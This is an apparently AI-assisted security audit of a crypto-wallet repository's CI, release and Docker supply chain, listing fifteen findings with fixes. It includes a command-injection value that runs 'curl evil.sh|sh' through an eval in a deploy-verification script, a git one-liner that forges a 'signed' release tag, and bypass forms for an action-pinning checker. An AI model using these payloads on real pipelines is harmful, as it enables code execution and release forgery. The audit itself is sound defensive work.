# Audit 05 - supply-chain-ci

AI-assisted review, not an independent professional audit. Snapshot: commit `88de0018b86884d49d70d269c430bdcbb39a0b4f` (read-only worktree). Static review only; no workflow was run, no npm install, no network lookups of action SHAs.

## Summary

Baseline is good: all actions SHA-pinned, `permissions: contents: read`, `persist-credentials: false`, no `pull_request_target`, no secrets in CI, `npm ci --ignore-scripts`, exact dependency pins, lockfile 100% `registry.npmjs.org` with integrity, release gated by an environment, attestation, deterministic tarball, SBOM. Prior items fixed since audit 03 S3-17: release workflow, Playwright in CI, Dependabot, `rm -rf dist` before release build, attest-build-provenance.

Main gaps: the "signed tag" gate is forgeable by text; `pages.yml` auto-publishes unreviewed `main` and contradicts the documented "hosting not enabled" policy; fund-holding contract packages (`pool-contracts`, `payer-hiding-contracts`, `pool-circuits/foundry`) are in no CI/release/nightly job; relayer/web Docker images still use mutable tags (S3-17e still open); `verify-sources.sh` `eval`s unvalidated manifest fields. No critical or high findings.

## Method

Read every file in `.github/**`, `scripts/**`, `infra/**`, all Dockerfiles/compose files, root and workspace `package.json`, `package-lock.json` (parsed offline: hosts, integrity, install scripts, nested duplicates), `THIRD_PARTY.md`, `deployments/`, `apps/web/scripts/scan-bundle.mjs`, package-level scripts (`fetch-entrypoint.sh`, `install-circom.sh`, `ceremony-dev.sh`, `pre-deploy-check.sh`). Compared against docs/audits/03 S3-04/S3-17, `docs/operators/release-and-verify.md`, `docs/operators/mirror-hosting.md`, `docs/remote/security-specs/supply-chain.md`. `npm audit` not run (needs registry + install); advisory status of lock entries is NOT assessed.

## Findings

### SUPPLY-CHAIN-CI-01 (medium) Tag "signature check" is a text grep; forgeable
`.github/workflows/release.yml:41` accepts any annotated tag whose object text contains `-----BEGIN (PGP|SSH) SIGNATURE-----`. Exploit: `git tag -a v9.9.9 -m $'x\n-----BEGIN PGP SIGNATURE-----\nAAAA\n-----END PGP SIGNATURE-----'` passes `verify`. The only remaining gate is a human approving the `release` environment (configured outside the repo; not verifiable). Docs (`release-and-verify.md:37`) disclose "presence only", but `SECURITY.md` and manifest field `signingKeyVerification` imply a signed-tag chain. Fix: commit a signers file and run `git -c gpg.ssh.allowedSignersFile=... verify-tag` (or `gpg` with a pinned keyring) in `verify`; fail otherwise. Confidence high (logic), environment/tag-ruleset state unknown.

### SUPPLY-CHAIN-CI-02 (medium) `pages.yml` auto-deploys unreviewed `main`; contradicts ADR-0015 / docs
`pages.yml:10-12` (push to main), `:37`, `:55-56`, `:60-74`. Every push to `main` builds and, once Pages source = "GitHub Actions" is toggled, publishes to GitHub Pages with no dependency on CI success (CI runs in parallel in `ci.yml`), no tag, no signature, no attestation, no `npm audit`. It consumes the cached libs `dist` from `setup-node-libs` (restored by `actions/cache`, no rebuild; release does `rm -rf` first), so a poisoned main-scope cache entry would ship. `release.yml:5` and `release-and-verify.md:18` state Pages is not enabled; `mirror-hosting.md` says do not publish before ADR-0015 gates. One repo-setting flip publishes a wallet front end from an unreviewed commit. Fix: delete or gate behind `workflow_dispatch` + protected environment + tag + `needs` on a verified CI run; build with `rm -rf dist`; update docs.

### SUPPLY-CHAIN-CI-03 (medium, conditional) GitHub Pages mirror shares origin with sibling Pages sites
Project Pages are served from `https://<owner>.github.io/GhostPay/`; IndexedDB/localStorage are per origin, not per path. The app keeps settings in localStorage (`apps/web/src/lib/settings.ts`: RPC URLs, pinned signer keys, relayer URL; see S3-25) and encrypted tag/profile records in IndexedDB (`idbStore.ts:3,24`, db `ghostpay-tags`). Any other Pages site under the same owner (or an XSS there) can read and rewrite them. Exploit: sibling page writes a hostile RPC/relayer URL or pinned signer into the shared origin's localStorage, or exfiltrates the encrypted records for offline attack. I did not find the keystore itself in browser storage (`keystore.ts` has no IDB/localStorage use), so key theft is not claimed. `mirror-hosting.md` lists header limits but not this. Fix: dedicated custom domain, or do not host on Pages; document.

### SUPPLY-CHAIN-CI-04 (medium) Contract packages holding funds are in no CI, nightly or release job
Only `packages/contracts` is built/tested/slithered/fuzzed (`ci.yml:180-289`, `nightly.yml`, `release.yml:56-61`). `grep` of `.github`/`scripts` for `pool-contracts`, `payer-hiding-contracts`, `pool-circuits`, `confidential-contracts` finds nothing. `pool-contracts` and `payer-hiding-contracts` have no `package.json`, so the `rest` npm group (`ci.yml:97-105`) never reaches them; `pool-circuits` runs only vitest, not its `foundry/` tests or `check:verifiers`. Impact: regression in the shielded-pool or EIP-7702 payer contracts (and the verifier-regeneration check) merges green; release `verify` also skips them. Their own docs say tests/Slither/Echidna are run locally. Fix: add forge test/fmt/Slither jobs per package and include in the `contracts` aggregate and release `verify`. Related note: committed pool verifiers come from a public-beacon dev ceremony (`ceremony-dev.sh:1-59`, proofs forgeable by design); nothing in CI/release blocks shipping them off testnet (contract-side guard is out of scope here).

### SUPPLY-CHAIN-CI-05 (medium) Docker images: mutable tags, no effective .dockerignore, relayer image not built/attested (S3-17e still open)
`apps/relayer/Dockerfile:5,15` (`node:22-bookworm-slim`, `distroless/nodejs22-debian12:nonroot`), `infra/web/Dockerfile:9,23` (`caddy:2-alpine`), `infra/devnet/Dockerfile.anvil:3` (`foundry:latest`), `Dockerfile.web:3`. No digest. No root `.dockerignore` or `apps/relayer/Dockerfile.dockerignore`; `apps/relayer/.dockerignore` is not read when building from repo root with `-f apps/relayer/Dockerfile`, so `COPY packages ./packages` (line 8) sends any local untracked files (`.env`, `*.key`, `relayer.config.json`, stale `dist`, `node_modules`) into the build context/stage; stale `dist` files survive (tsc does not clean). Final stage copies only selected paths, limiting leak to build cache/remote builders. Relayer image holds the hot key at runtime yet is not built, scanned, SBOM'd or attested (`release-and-verify.md:127`); Dependabot has no `docker` ecosystem. Fix: pin by digest, add root `.dockerignore`, `rm -rf packages/*/dist` in build, add docker to Dependabot and an attested image build to release.

### SUPPLY-CHAIN-CI-06 (medium) `verify-sources.sh` evals manifest-derived strings
`scripts/testnet/verify-sources.sh:126-136,145`: `router`, `relayer`, `announcer`, `fee`, `solcVersion` are read from `deployments/<id>.json` with no validation and interpolated into command strings run via `eval "$c"`. Failing input: `"solcVersion": "0.8.28; curl evil.sh|sh #"` in a merged manifest executes in the operator's shell with `ETHERSCAN_API_KEY` in env. Schema validation exists only inside `make-manifest.mjs` at generation time (`deployments/schema.json:60` has the right pattern); no CI step or script validates committed manifests (`deployments.test.ts` checks schema/key sync, not file contents). Needs a malicious manifest PR to be merged, hence medium. Also: with only `VERIFIER_URL` set, line 145 `${c//$ETHERSCAN_API_KEY/***}` aborts under `set -u` (functional bug). Fix: build an argv array, no `eval`; validate fields against regexes; add CI validation of `deployments/*.json`.

### SUPPLY-CHAIN-CI-07 (low) Attestation-minting job installs unneeded tooling and builds with floating toolchain
`release.yml:78-92`: `build` has `id-token: write` + `attestations: write` and also runs `foundry-toolchain` (binary downloaded; integrity not verified by this repo) although `release-build.sh` never calls forge except `forge --version` for the manifest. Node `"22"` and `ubuntu-latest` float, so tarball/manifest bytes depend on runner image (`gen-release-manifest.mjs:126-134` embeds node/npm/forge/tar/gzip versions; `repro-check.sh` compares only tarball and SBOM on one host). Dependency build code (vite plugins) executes with the OIDC identity. Fix: drop foundry from `build`, pin Node patch and runner image, run build and attest in separate jobs (build without id-token, attest with only artifact).

### SUPPLY-CHAIN-CI-08 (low) Attestation verification guidance does not bind workflow/ref
`verify-release.sh:207` and `release-and-verify.md:82` use `gh attestation verify <file> --repo <owner>/<repo>`. That accepts any attestation from any workflow/ref in the repo (e.g. a branch workflow with `id-token: write` by a writer). Fix: add `--signer-workflow <owner>/<repo>/.github/workflows/release.yml --source-ref refs/tags/<tag>`; have the script run it when `gh` exists. Also `verify-release.sh:191-198` checks path strings only, not symlink/hardlink/device entries (`tar -tzf`, no `-v`); `ipfs-publish.sh:31` hashes `-type f` only with `xargs` (no `-0`), omitting symlinks and mishandling names with spaces.

### SUPPLY-CHAIN-CI-09 (low) `check-actions-pinned.sh` limits; SHA-to-tag unverified (S3-17a still open)
`scripts/check-actions-pinned.sh:92` only matches `^\s*(- )?uses:` lines. Bypass forms: `uses : x@v1`, `"uses": ...`, flow maps `- {uses: x@main}`. The `# vX` comment is not checked against the SHA, and a SHA from a fork network is accepted. I could not verify that any pinned SHA maps to its commented tag (GitHub API not available here). Prints OK when 0 references found. Fix: use a YAML parser, add `zizmor`/`pinact` check; verify SHAs with `gh api` once.

### SUPPLY-CHAIN-CI-10 (low) Secret scanning is a thin regex
`scripts/scan-secrets.sh:10,16-18`: matches only `PRIVATE KEY-----` or `0x<64hex>` with `private|secret` on the same line, excludes `docs`, tests, `*.md`; no mnemonics, API keys (Etherscan, RPC URLs with keys, pinning JWTs), no history scan, no `relayer.config.json`/`*.key`/`*.secret` filename rule (`.gitignore` lacks them, S3-17e). Fix: add gitleaks/trufflehog and enable GitHub push protection.

### SUPPLY-CHAIN-CI-11 (low) CI/tooling installs without hashes
`ci.yml:272`, `nightly.yml:360,426,447`: `pip install slither-analyzer==0.11.6 solc-select==1.2.0 / mythril==0.24.8 / crytic-compile==0.4.2` pin only top-level; transitive deps float, no `--require-hashes`. `solc-select install` downloads compilers from the network. `packages/payer-hiding-contracts/scripts/fetch-entrypoint.sh:12` does `npm pack` of a version without integrity check. Positive: echidna tarball (`nightly.yml:410,423`) and circom (`install-circom.sh:21`) are sha256-checked; Bitcoin Core Dockerfile requires a caller-supplied hash. Jobs have no secrets, so impact is CI integrity (nightly results), not key theft.

### SUPPLY-CHAIN-CI-12 (low) Deploy script guards
`scripts/testnet/deploy.sh:95-96`: dev-key refusal compares exact string; `PRIVATE_KEY` in different case or without `0x` bypasses it (testnet funds only). `:56` rehearsal cleanup deletes all files in `broadcast/Deploy.s.sol/<chain>` although the pre-check (`:51`) only tests `run-latest.json`, so older `run-<ts>.json` records of a real deployment can be deleted. `:25` and `scripts/devnet/lib.sh:91` append hardcoded `/root/.foundry/bin` to PATH. `PRIVATE_KEY` is visible in `ps` (documented). Positive: chain-id check, `CONFIRM_BROADCAST`, keystore preferred.

### SUPPLY-CHAIN-CI-13 (low) Governance and policy controls absent or unenforced in repo
No `.github/CODEOWNERS` (only vendored forge-std), CodeQL or dependency-review. Workflows, `scripts/`, `deployments/`, `infra/` can change without designated reviewers (branch protection, tag rulesets, `release` environment reviewers are repo settings; not verifiable). `SECURITY.md` rule "no new runtime dependency without THIRD_PARTY.md entry" and SC-PIN-1 (exact pins) are unenforced: `THIRD_PARTY.md` says `--check` "not wired in yet". Today all `package.json` versions are exact (checked). Dependabot covers github-actions and npm only (`.github/dependabot.yml`), no docker/pip, no cooldown. Docs drift: `release-and-verify.md:18,121` say no Pages steps and no Echidna/Mythril config, but `pages.yml` and `nightly.yml:402-449` exist. Nightly Echidna/Mythril install steps "unverified" (`nightly.yml:321`).

### SUPPLY-CHAIN-CI-14 (info) Dependency posture from lockfile
761 lock entries; all `https://registry.npmjs.org`, all with integrity, no git/tarball deps. Install scripts only `fsevents` (optional dev), `keccak`, `secp256k1` (dev, via hardhat); CI always uses `--ignore-scripts`. Overrides: `ws 8.21.0`, `underscore 1.13.8`. Prod tree has multiple noble majors (`viem`, `ox`, `@scure/bip32`, `ethers`, `@zk-kit/utils` nest 1.x; documented in THIRD_PARTY.md section 1). `@0xbow/privacy-pools-core-sdk` (prod of `external-pools-privacypools`, not a web dependency) nests `viem 2.22.14`, `snarkjs 0.7.5` (GPL-3.0), noble 1.8.1. Dev: `hardhat 2.29.1` brings `undici 5.29.0`, `elliptic 6.6.1`, `cookie 0.4.2`; `tfhe`/`node-tfhe` 1.4.0-alpha.3. Advisory status not checked (no `npm audit` possible offline). `apps/relayer` uses `@types/node 26.6.5` while engines say Node >=22 (type drift, not a security issue).

### SUPPLY-CHAIN-CI-15 (info) Web bundle scan is a heuristic backstop
`apps/web/scripts/scan-bundle.mjs`: regex over minified `.js/.mjs/.css`; hosts built via string concatenation, `//host` protocol-relative strings, `.wasm`, and non-index HTML are not covered; `connect-src 'self' https: wss:` in all proxy configs (`infra/proxy/Caddyfile:26`, `Caddyfile.static:14`) lets any compromised dependency exfiltrate to any https host. Known trade-off (S3-11); relevant because dependency compromise is the primary supply-chain threat to the bundle. Other infra checks passed: proxy overwrites XFF, `/metrics` not routed, headers match via `check-headers.sh` (not referenced by any workflow or package script, so drift is not caught in CI).
